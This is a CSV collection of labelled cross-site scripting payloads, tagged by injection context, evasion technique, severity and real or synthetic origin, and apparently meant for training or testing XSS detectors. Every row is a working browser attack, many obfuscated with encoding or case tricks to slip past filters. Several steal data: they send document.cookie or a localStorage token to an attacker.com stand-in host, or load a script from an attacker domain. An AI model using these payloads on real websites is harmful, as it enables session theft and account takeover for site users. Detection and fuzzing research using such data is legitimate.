payload,context,technique,severity,length,source
"<rtc onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</rtc>",tag_injection,none,medium,68,real
%3Cscript%3Ewindow['console.log'](document.domain)%3C/script%3E,script_injection,synthetic,low,63,synthetic
"<iframe srcdoc=""<script>top[//.source+//ert//.source](document.cookie)</script>""></iframe>",dom_sink,none,high,90,real
"<b onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</b>",tag_injection,none,medium,63,real
javascript:\\\\\\\\\\\\\\\/\\\\\\\\\\\\\\\/%250Aalert(1),js_uri,url_encoding,medium,56,real
"<foRm
OnwEbkItaNimAtiOneNd=ProMpt('XSS')>",tag_injection,synthetic,medium,41,synthetic
	onDroP=aLerT(dOcuMenT.dOmaIn),event_handler,synthetic,medium,30,synthetic
"var str = ""jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"";",js_uri,comment_injection|url_encoding|case_variation,medium,157,real
'><script>\u0061lert(1)</script>,script_injection,synthetic,low,32,synthetic
"\"" onpageswap=console.log(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,58,synthetic
	onmous&#101;&#101;nt&#101;r=prompt(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,61,synthetic
"element.setAttribute(""onclick"",""\u0061lert(document.cookie+'&loc='+location.href)"")",dom_sink,synthetic,high,83,synthetic
"<th id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></th>",tag_injection,none,medium,80,real
"<&#97;
onb&#101;for&#101;m&#97;tch=prompt(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,medium,68,synthetic
<meta id=x tabindex=1 ondeactivate=alert(1)></meta><input id=y autofocus>,tag_injection,none,medium,73,real
' %3E%3Csvg ontouchend=console.log(1)%3E,attribute_escape,synthetic,medium,40,synthetic
`><img src=x ontouchmove=confirm(document.domain)>,attribute_escape,synthetic,medium,50,synthetic
"__proto__[""on&#97;nim&#97;tionst&#97;rt""]=XMLHttpR&#101;qu&#101;st(String.fromCh&#97;rCod&#101;(88,83,83))",dom_sink,synthetic,high,106,synthetic
"<q onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</q>",tag_injection,none,medium,63,real
"<marquee x=y onbeforetoggle=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,70,synthetic
"""><table onmozfullscreenchange=confirm(1)>",tag_injection,synthetic,medium,42,synthetic
oncontextmenu=confirm/*x*/('XSS'),event_handler,synthetic,low,33,synthetic
"%22 ><svg onanimationiteration=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,68,synthetic
"""><img src=x ondrop=confirm(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,medium,51,synthetic
'><img src=x ontransitionend=\u0061lert(document.domain)>,attribute_escape,synthetic,low,57,synthetic
""" ><svG oNtoUchEnd=alErt('XSS')>",attribute_escape,synthetic,medium,32,synthetic
<emBed onMozFulLscReeNchAngE=cOnsOle.loG(dOcuMenT.dOmaIn) onMozFulLscReeNchAngE=cOnsOle.loG(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,109,synthetic
<event-source src=javascript:alert(1)>,js_uri,none,medium,38,real
%22><img src=x onend=alert(%27XSS%27)>,attribute_escape,synthetic,medium,38,synthetic
<rt id=x tabindex=1 onactivate=alert(1)></rt>,tag_injection,none,medium,45,real
%27><img src=x onpointerover=confirm(location.hash)>,attribute_escape,synthetic,medium,52,synthetic
' oNdrOp=ConFirM(1) ',attribute_escape,synthetic,medium,21,synthetic
"EleMenT.sEtATtrIbuTe(""onCliCk"",""eVal(btOa(DocUmeNt.CooKie))"")",dom_sink,synthetic,high,61,synthetic
<script>({0:#0=alert/#0#/#0#(0)})</script>,script_injection,none,low,42,real
"""><Img onKeyPreSs=ConSolE.lOg(1)>",tag_injection,synthetic,medium,33,synthetic
"""%3E%3Ctr ontoggle=console.log(document.domain)%3E",tag_injection,synthetic,medium,50,synthetic
"<i oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,94,real
#set($x='alert('XSS')')$x,template_injection,synthetic,medium,25,synthetic
""" ><svg onpointercancel=console.log(document.domain)>",attribute_escape,synthetic,medium,53,synthetic
"<bdi draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</bdi>",tag_injection,none,medium,84,real
"JavaScript://%250Aalert?.(1)//'/*\'/*""/*\""/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->",template_injection,comment_injection|url_encoding|case_variation,low,216,real
%3Cimg src=x onpageswap=console.log(1)%3E,tag_injection,synthetic,medium,41,synthetic
'><img src=x onbeforepaste=alert(1)>,attribute_escape,synthetic,medium,36,synthetic
<scRipT>FUncTioN('ProMpt(1)')();</scRipT>,script_injection,synthetic,medium,41,synthetic
%22 onmouseover=confirm(1) x=%22,attribute_escape,synthetic,medium,32,synthetic
"%22><img src=x onscrollsnapchange=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,72,synthetic
#{{AleRt(1)}},template_injection,synthetic,medium,13,synthetic
"javascript://</title></style></textarea>--></script><a""//' onclick=alert()//>*/alert()/*",js_uri,none,medium,88,real
OnwHeeL=pRomPt(1),event_handler,synthetic,medium,17,synthetic
"__proto__[""onbeforecut""]=eval('//attacker.com/?c='+document.cookie)",dom_sink,synthetic,high,67,synthetic
"<marquee onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</marquee>",tag_injection,none,medium,75,real
"</script><img/*%00/src=""worksinchrome&colon;prompt&#x28;1440&#x29;""/%00*/onerror='eval(src)'>",dom_sink,html_entity|encoding|comment_injection|url_encoding,low,93,real
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onwebkitanimationend=""alert(1)""></textarea>",tag_injection,none,medium,107,real
<!--><select onpromptdismiss=console.log(1)>,tag_injection,synthetic,medium,44,synthetic
'><Img srC=x onProMptDisMisS=aLerT('XSS')>,attribute_escape,synthetic,medium,42,synthetic
"='><script>alert(""xss"")</script>",script_injection,none,medium,32,real
"	onAniMatIonIteRatIon=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))",event_handler,synthetic,high,64,synthetic
"<div draggable=""true"" contenteditable>drag me</div><bdo ondrop=alert(1) contenteditable>drop here</bdo>",tag_injection,none,medium,103,real
""" ><svG oNdrOp=ProMpt('XSS')>",attribute_escape,synthetic,medium,29,synthetic
"ontr&#97;nsitionst&#97;rt=consol&#101;.log&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler,synthetic,low,90,synthetic
<plaintext onfocusout=alert(1) tabindex=1 id=x></plaintext><input autofocus>,tag_injection,none,medium,76,real
\%22 onwebkitfullscreenchange=alert(%27XSS%27)//,attribute_escape,synthetic,medium,48,synthetic
&amp;lt;img/src/onerror=alert(`AnonKryptiQuz`)&amp;gt;,event_handler,none,medium,54,real
' ><svg onpagereveal=\u0061lert(location.hash)>,attribute_escape,synthetic,low,47,synthetic
"<listing onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</listing>",tag_injection,none,medium,90,real
"<area onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</area>",tag_injection,none,medium,70,real
""" %3E%3Csvg onfocusout=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,68,synthetic
	ontransitionrun=alert(document.domain),event_handler,synthetic,medium,39,synthetic
"""%3E%3Cimg src=x onpointermove=prompt(location.hash)%3E",attribute_escape,synthetic,medium,55,synthetic
\%22 oninput=alert(document.domain)//,attribute_escape,synthetic,medium,37,synthetic
<img/’onerror=alert(1) src=a>,tag_injection,none,medium,29,real
"""%3E%3Cimg src=x onmozfullscreenchange=alert(1)%3E",attribute_escape,synthetic,medium,50,synthetic
"<style>@keyframes slidein {}</style><aside style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></aside>",tag_injection,none,medium,164,real
"<element onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</element>",tag_injection,none,medium,75,real
{{#WitH aLerT('XSS')}}...{{/wiTh}},template_injection,synthetic,medium,34,synthetic
' oNwhEel=alErt('XSS') ',attribute_escape,synthetic,medium,24,synthetic
"' ><svg on&#97;nim&#97;tion&#101;nd=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,84,synthetic
"<style>:target {color: red;}</style><menu id=x style=""transition:color 10s"" ontransitioncancel=print()></menu>",tag_injection,none,low,110,real
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera},script_injection,url_encoding|case_variation,low,43,real
"<kbd draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</kbd>",tag_injection,none,medium,82,real
OnwEbkItfUllScrEenChaNge=jaVasCriPt:ProMpt(doCumEnt.doMaiN),event_handler,synthetic,medium,59,synthetic
""" ><svg oncut=&#97;l&#101;rt('XSS')>",attribute_escape,synthetic,low,36,synthetic
<taBle onMozFulLscReeNchAngE=cOnfIrm(1) onMozFulLscReeNchAngE=cOnfIrm(1)>,tag_injection,synthetic,medium,73,synthetic
"__proto__[""ongestureend""]=console.log(document.cookie+'&loc='+location.href)",dom_sink,synthetic,high,76,synthetic
<noscript/onpaste=confirm(location.hash)>,tag_injection,synthetic,medium,41,synthetic
__proto__[%22onpageshow%22]=eval(document.cookie),dom_sink,synthetic,high,49,synthetic
<tr x=y onpointerrawupdate=alert(location.hash)>,tag_injection,synthetic,medium,48,synthetic
"<div draggable=""true"" contenteditable>drag me</div><dir ondragover=alert(1) contenteditable>drop here</dir>",tag_injection,none,medium,107,real
"<div draggable=""true"" contenteditable>drag me</div><frameset ondragover=alert(1) contenteditable style=display:block>drop here</frameset>",tag_injection,none,medium,137,real
"' ><svg onerror=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,53,synthetic
"<style>:target {color: red;}</style><details id=x style=""transition:color 10s"" ontransitioncancel=print()></details>",tag_injection,none,low,116,real
"<noscript onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</noscript>",tag_injection,none,medium,89,real
' oNhaShcHanGe=ProMpt('XSS') ',attribute_escape,synthetic,medium,30,synthetic
"OnmOzfUllScrEenChaNge=jaVasCriPt:ProMpt(StRinG.fRomChaRCoDe(88,83,83))",event_handler,synthetic,high,70,synthetic
"javascript://'/</title></style></textarea></script>--><p"" %0A onclick=alert()//>*/alert()/*",js_uri,url_encoding,medium,91,real
 onwebkitfullscreenchange=prompt(1),event_handler,synthetic,medium,35,synthetic
"""><script src=""https://js.rip/[ATTACKER.DOMAIN.TLD]""></script>",script_injection,none,low,62,real
`><img src=x onreset=alert(%27XSS%27)>,attribute_escape,synthetic,medium,38,synthetic
%3Cmtext x=y onfocusout=confirm(location.hash)%3E,tag_injection,synthetic,medium,49,synthetic
<maRquEe OnaUxcLicK=cOnfIrm(loCatIon.haSh)>,tag_injection,synthetic,medium,43,synthetic
"\"" on&#101;nd=&#97;l&#101;rt('XSS')//",attribute_escape,synthetic,low,37,synthetic
"<body onmouseenter=""alert(1)"">AnonKryptiQuz</body>",tag_injection,none,medium,50,real
"<a onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</a>",tag_injection,none,medium,55,real
' onmous&#101;down=consol&#101;.log('XSS') ',attribute_escape,synthetic,low,44,synthetic
OnpAgeHidE=pRomPt&#40;doCumEnt.doMaiN&#41;,event_handler,synthetic,low,42,synthetic
"<IMG SRC=x oninvalid=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,60,real
"<tr onclick=""alert(1)"">AnonKryptiQuz</tr>",tag_injection,none,medium,41,real
${\u0061lert?new()('document.cookie')},template_injection,synthetic,high,38,synthetic
"<m&#101;t&#97;	onh&#97;shch&#97;ng&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,89,synthetic
%22 ><svg ontouchmove=alert(location.hash)>,attribute_escape,synthetic,medium,43,synthetic
%3Ctd src=x onwebkitanimationend=prompt('XSS')%3E,tag_injection,synthetic,medium,49,synthetic
"<table onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</table>",tag_injection,none,medium,63,real
&quot; onpointercancel=prompt(1) x=&quot;,attribute_escape,synthetic,medium,41,synthetic
"data:text/html,<scr	ipt>prompt(document.domain)</scr	ipt>",js_uri,synthetic,medium,57,synthetic
"<basefont draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</basefont>",tag_injection,none,medium,74,real
' %3E%3Csvg onpopstate=confirm(document.domain)%3E,attribute_escape,synthetic,medium,50,synthetic
"<td draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</td>",tag_injection,none,medium,62,real
#{{confirm(document.cookie)}},template_injection,synthetic,high,29,synthetic
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=confirm(String.fromCharCode(88,83,83))>"")",dom_sink,synthetic,high,100,synthetic
' onp&#97;us&#101;=confirm('XSS') ',attribute_escape,synthetic,medium,35,synthetic
"<style>@keyframes x{}</style><input4 style=""animation-name:x"" onanimationstart=""alert(1)""></input4>",tag_injection,none,medium,99,real
"<script	>confirm(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection,synthetic,medium,65,synthetic
"document.write(""<img src=x onerror=XMLHttpRequest(navigator.sendBeacon('//attacker.com',document.cookie))>"")",dom_sink,synthetic,high,108,synthetic
	onbeforepaste=confirm(1),event_handler,synthetic,medium,25,synthetic
<obj&#101;ct onvolum&#101;ch&#97;ng&#101;=&#97;l&#101;rt(1) onvolum&#101;ch&#97;ng&#101;=&#97;l&#101;rt(1)>,tag_injection,synthetic,low,107,synthetic
<animatetransform onpointermove=console.log(%27XSS%27)/>,tag_injection,synthetic,medium,56,synthetic
%27><img src=x oninvalid=confirm(1)>,attribute_escape,synthetic,medium,36,synthetic
<svg////////onload=alert(1)>,tag_injection,none,medium,28,real
%22><a onmozfullscreenchange=alert(location.hash)>,tag_injection,synthetic,medium,50,synthetic
javascript:void(confirm(location.hash)),js_uri,synthetic,medium,39,synthetic
""" onpagehide=confirm(1) """,attribute_escape,synthetic,medium,25,synthetic
%3Cembed onmozfullscreenchange=confirm(location.hash) onmozfullscreenchange=confirm(location.hash)%3E,tag_injection,synthetic,medium,101,synthetic
""" ><svg onr&#101;s&#101;t=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,81,synthetic
""" ><svg onblur=\u0061lert(location.hash)>",attribute_escape,synthetic,low,41,synthetic
onbegin=javascript:console.log('XSS'),event_handler,synthetic,medium,37,synthetic
"""><img src=x oncut=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,66,synthetic
<noScrIpt	onPasTe=ConFirM(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,41,synthetic
"<style>:target {transform: rotate(180deg);}</style><option id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></option>",tag_injection,none,medium,130,real
"<style>:target {color:red;}</style><mark id=x style=""transition:color 1s"" ontransitionend=alert(1)></mark>",tag_injection,none,medium,106,real
"%27 ><svg onended=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,57,synthetic
&quot; ons&#101;&#97;rch=&#97;l&#101;rt(1) x=&quot;,attribute_escape,synthetic,low,51,synthetic
onscrollsnapchange=\u0061lert(location.hash),event_handler,synthetic,low,44,synthetic
""" oNcoNteXtmEnu=alErt(1) """,attribute_escape,synthetic,medium,26,synthetic
<audio controls src=1 onfocusin=alert(1) autofocus>,tag_injection,none,medium,51,real
""" %3E%3Csvg ontransitionend=alert(document.domain)%3E",attribute_escape,synthetic,medium,53,synthetic
<m&#101;t&#97; src=x ondrop=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,69,synthetic
%22 onselect=confirm(location.hash) %22,attribute_escape,synthetic,medium,39,synthetic
"<frame onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</frame>",tag_injection,none,medium,86,real
<script>window['prompt']('XSS')</script>,script_injection,synthetic,low,40,synthetic
"`><img src=x onbeforetoggle=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,65,synthetic
"OngOtpOinTerCapTurE=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,62,synthetic
"""><img src=x onb&#101;gin=confirm(1)>",attribute_escape,synthetic,medium,37,synthetic
"%3Csource x=y onvolumechange=confirm(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,70,synthetic
"<center onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></center>",tag_injection,none,medium,285,real
"' %3E%3Csvg onpromptdismiss=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,69,synthetic
"<div draggable=""true"" contenteditable>drag me</div><multicol ondragover=alert(1) contenteditable>drop here</multicol>",tag_injection,none,medium,117,real
`><Img srC=x onPagEhiDe=AleRt(DocUmeNt.DomAin)>,attribute_escape,synthetic,medium,47,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onp&#97;g&#101;r&#101;v&#101;&#97;l"":XMLHttpR&#101;qu&#101;st})",dom_sink,synthetic,high,95,synthetic
""" oNbeForEinPut=coNsoLe.Log(doCumEnt.doMaiN) """,attribute_escape,synthetic,medium,46,synthetic
"<style>:target {color:red;}</style><span id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></span>",tag_injection,none,medium,112,real
"<datalist oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</datalist>",tag_injection,none,medium,68,real
 oninput=alert(location.hash),event_handler,synthetic,medium,29,synthetic
"<details draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</details>",tag_injection,none,medium,72,real
 oncont&#101;xtm&#101;nu=&#97;l&#101;rt('XSS'),event_handler,synthetic,low,46,synthetic
""" oNbeForEinPut=coNsoLe.Log('XSS') """,attribute_escape,synthetic,medium,36,synthetic
<svg/onload​=alert&sol;**&sol;(3)>,generic,none,low,34,real
"<time draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</time>",tag_injection,none,medium,86,real
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=fEtcH(lOcaLStOraGe.GetIteM('TokEn'))>""",dom_sink,synthetic,high,82,synthetic
%3Cnoscript onpaste=confirm(location.hash) onpaste=confirm(location.hash)%3E,tag_injection,synthetic,medium,76,synthetic
"<xmp ontouch&#101;nd=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,low,78,synthetic
	onKeyDowN=cOnfIrm('XSS'),event_handler,synthetic,medium,25,synthetic
"<dir draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</dir>",tag_injection,none,medium,64,real
"<menu onclick=""alert(1)"">AnonKryptiQuz</menu>",tag_injection,none,medium,45,real
<mt&#101;xt	on&#101;nd&#101;d=confirm(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,64,synthetic
"LocAtiOn=""jaVasCriPt:AleRt(DocUmeNt.CooKie)""",dom_sink,synthetic,high,44,synthetic
%22><img src=x onwheel=console.log(document.domain)>,attribute_escape,synthetic,medium,52,synthetic
"' ><svg oncopy=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,70,synthetic
"""><plaintext onrepeat=prompt('XSS')>",tag_injection,synthetic,medium,36,synthetic
%uff1cscript%uff1ealert(1234)%uff1c/script%uff1e,generic,none,medium,48,real
"<img src=""blah""onmouseover=""document.vulnerable=true;"">",dom_sink,none,low,55,real
" onw&#101;bkittr&#97;nsition&#101;nd=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,91,synthetic
"' ontoggle=confirm(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,high,51,synthetic
"""><mtext onmousedown=console.log(1)>",tag_injection,synthetic,medium,36,synthetic
"<style>@keyframes x{}</style><td style=""animation-name:x"" onwebkitanimationend=""alert(1)""></td>",tag_injection,none,medium,95,real
&quOt; onAniMatIonIteRatIon=coNsoLe.Log(1) x=&quOt;,attribute_escape,synthetic,medium,51,synthetic
<rtc onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
"<style>:target {color: red;}</style><article id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></article>",tag_injection,none,medium,117,real
"<spacer onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</spacer>",tag_injection,none,medium,70,real
"<video onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</video>",tag_injection,none,medium,71,real
"\"" ontouchmove=\u0061lert(location.hash)//",attribute_escape,synthetic,low,42,synthetic
`><img src=x oncut=\u0061lert('XSS')>,attribute_escape,synthetic,low,37,synthetic
"<IMG DYNSRC=""javascript:alert('AnonKryptiQuz')"">",js_uri,case_variation,medium,48,real
'%3E%3Cimg src=x onerror=confirm(location.hash)%3E,attribute_escape,synthetic,medium,50,synthetic
"""%3E%3Cimg src=x ondragover=prompt(1)%3E",attribute_escape,synthetic,medium,40,synthetic
"\' ons&#101;l&#101;ct=confirm(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,medium,71,synthetic
"$ echo ""<svg^Lonload^L=^Lalert(1)^L>"" | xxd",generic,none,medium,43,real
"<img/src=""xss.png""alt=""AnonKryptiQuz"">",attribute_escape,none,low,38,real
onplaying=\u0061lert(1),event_handler,synthetic,low,23,synthetic
<!--><DiaLog onStaLleD=cOnfIrm('XSS')>,tag_injection,synthetic,medium,38,synthetic
"<tt onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</tt>",tag_injection,none,medium,65,real
<nobr onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,66,real
onfocusin=confirm('XSS'),event_handler,synthetic,medium,24,synthetic
"<noframes onmouseenter=""alert(1)"">AnonKryptiQuz</noframes>",tag_injection,none,medium,58,real
`><Img srC=x onTraNsiTioNruN=cOnsOle.loG('XSS')>,attribute_escape,synthetic,medium,48,synthetic
"""%3E%3Cimg src=x onload=alert(1)%3E",attribute_escape,synthetic,medium,35,synthetic
\' onkeydown=prompt('XSS')//,attribute_escape,synthetic,medium,28,synthetic
%22><img src=x onpointermove=alert(document.domain)>,attribute_escape,synthetic,medium,52,synthetic
<tr x=Y oNtoGglE=cOnsOle.loG(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,46,synthetic
<baSe/OnpOinTerUp=AleRt(LocAtiOn.HasH)>,tag_injection,synthetic,medium,39,synthetic
' %3E%3Csvg ontransitionrun=console.log('XSS')%3E,attribute_escape,synthetic,medium,49,synthetic
""" oNkeYprEss=coNfiRm('XSS') """,attribute_escape,synthetic,medium,29,synthetic
"<noScrIpt onBefOreMatCh=ConFirM(STriNg.FroMChArCOde(88,83,83))/>",tag_injection,synthetic,high,64,synthetic
OnsCroLlsNapChaNge=alErt/***/(LocAtiOn.HasH),event_handler,synthetic,low,44,synthetic
"<content onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</content>",tag_injection,none,medium,74,real
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=prompt('XSS')%3E"")",dom_sink,synthetic,medium,79,synthetic
"<style>:target {transform: rotate(180deg);}</style><noframes id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></noframes>",tag_injection,none,medium,134,real
""" onend=confirm(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,high,48,synthetic
"' ><svG oNtoUchEnd=prOmpT(STriNg.FroMChArCOde(88,83,83))>",attribute_escape,synthetic,high,57,synthetic
"xss""><!--><svg/onload=alert(document.domain)>",dom_sink,none,medium,45,real
"%27><img src=x onended=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,60,synthetic
<diAloG oNplAy=ProMpt(doCumEnt.doMaiN) OnpLay=prOmpT(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,70,synthetic
"<noembed draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</noembed>",tag_injection,none,medium,72,real
	onfocusout=&#97;l&#101;rt('XSS'),event_handler,synthetic,low,33,synthetic
""" ><svG oNtoUchEnd=coNsoLe.Log(1)>",attribute_escape,synthetic,medium,34,synthetic
{{ AleRt(DocUmeNt.DomAin) }},template_injection,synthetic,medium,28,synthetic
onhashchange=alert/**/('XSS'),event_handler,synthetic,low,29,synthetic
%253cscript%253ealert(1)%253c/script%253e,generic,url_encoding,medium,41,real
"self[Object.keys(self)[a()]](""1"") // alert(""1"")",generic,none,medium,47,real
	onpointermove=alert(%27XSS%27),event_handler,synthetic,medium,31,synthetic
"__pRotO__[""oNreSet""]=XMLHttPReQueSt(StrIng.frOmCHarCodE(88,83,83))",dom_sink,synthetic,high,66,synthetic
 onfocusout=prompt('XSS'),event_handler,synthetic,medium,25,synthetic
onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt&#40;1&#41;,event_handler,synthetic,low,53,synthetic
<noembed contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,61,real
"\"" onmouseover=prompt(document.domain)//",attribute_escape,synthetic,medium,40,synthetic
"<dl onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</dl>",tag_injection,none,medium,79,real
<xmp/ontransitionend=alert(location.hash)>,tag_injection,synthetic,medium,42,synthetic
' oNtrAnsItiOnrUn=ConSolE.lOg('XSS') ',attribute_escape,synthetic,medium,38,synthetic
<frameset onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</frameset>,tag_injection,none,medium,82,real
&quot; onbegin=confirm(1) x=&quot;,attribute_escape,synthetic,medium,34,synthetic
<script>prompt(loc&#97;tion.h&#97;sh)</script>,script_injection,synthetic,medium,46,synthetic
"\"" onwheel=console.log(location.hash)//",attribute_escape,synthetic,medium,39,synthetic
"<style>@keyframes x{}</style><header style=""animation-name:x"" onwebkitanimationend=""alert(1)""></header>",tag_injection,none,medium,103,real
"${{'coNfiRm(DocUmeNt.DomAin)'.RepLacE('ConFirM(dOcuMenT.dOmaIn)','')}}",template_injection,synthetic,medium,70,synthetic
<noscript onb&#101;for&#101;m&#97;tch=consol&#101;.log('XSS')>,tag_injection,synthetic,low,62,synthetic
<link src=x oninput=\u0061lert(document.domain)>,tag_injection,synthetic,low,48,synthetic
<area/onpointercancel=console.log(document.domain)>,tag_injection,synthetic,medium,51,synthetic
${prompt(document.cookie)},template_injection,synthetic,high,26,synthetic
"ong&#101;stur&#101;&#101;nd=confirm/***/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,80,synthetic
<fieldset id=x tabindex=1 onfocusin=alert(1)></fieldset>,tag_injection,none,medium,56,real
`%3E%3Cimg src=x ontransitionrun=console.log('XSS')%3E,attribute_escape,synthetic,medium,54,synthetic
"__pRotO__[""oNmoUseDowN""]=alErt('//atTacKer.coM/?C='+doCumEnt.coOkiE)",dom_sink,synthetic,high,68,synthetic
<anImaTemOtiOn X=y onDroP=cOnfIrm(loCatIon.haSh)>,tag_injection,synthetic,medium,49,synthetic
""" ><svg onfocusout=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,low,57,synthetic
"<bgsound onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</bgsound>",tag_injection,none,medium,69,real
